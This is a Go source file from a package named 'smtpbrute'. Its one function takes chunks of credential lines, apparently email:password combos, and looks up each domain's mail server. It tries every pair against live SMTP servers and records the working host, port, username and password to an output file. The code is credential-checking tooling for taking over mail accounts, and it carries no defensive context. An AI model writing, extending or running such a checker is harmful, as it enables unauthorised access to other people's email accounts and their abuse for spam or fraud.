package smtpbrute

import (
	"fmt"
	"os"
	"sync"

	"github.com/fatih/color"
)

func ProcessCredentials(wordList <-chan []string, file *os.File, index int, testEmail string, mutex *sync.Mutex, wg *sync.WaitGroup) {
	defer wg.Done()
	wordListChunks := <-wordList
	green := color.New(color.FgGreen).PrintfFunc()
	red := color.New(color.FgRed).PrintfFunc()
	for _, creds := range wordListChunks {
		splitedCreds, err := FilterGmailCreds(creds)
		if err == nil {
			smtpCreds, err := LookupDomain(splitedCreds)
			if err == nil {
				results, err := ConnectSMTP(smtpCreds, testEmail)
				if err == nil {
					mutex.Lock()
					host, port, username, password := results[2], results[3], results[0], results[1]
					green("%s\t%s\t%s\t%s\n", host, port, username, password)
					finalCreds := fmt.Sprintf("%s:%s => %s:%s\n", host, port, username, password)
					file.WriteString(finalCreds)
					mutex.Unlock()
				} else {
					red("%s index: %d\n", results, index)
				}

			}

		}
	}
}
